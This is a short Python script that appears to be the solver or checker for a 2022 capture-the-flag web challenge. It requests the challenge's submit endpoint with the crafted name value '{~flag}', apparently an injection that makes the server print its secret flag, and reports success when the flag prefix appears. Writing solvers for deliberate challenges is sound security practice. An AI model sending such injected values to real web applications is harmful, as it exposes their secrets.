import requests

CHAL_URL = 'https://wsc-2022-web-3-bvel4oasra-uc.a.run.app/'
FLAG_PREFIX = 'wsc{'


def solve():
    url = CHAL_URL + 'submit?name={~flag}&color=blue'
    response = requests.get(url)
    if response.status_code < 300 and (FLAG_PREFIX in response.text):
        print('solved')
    else:
        print('Error: ', response.status_code, response.text)


solve()
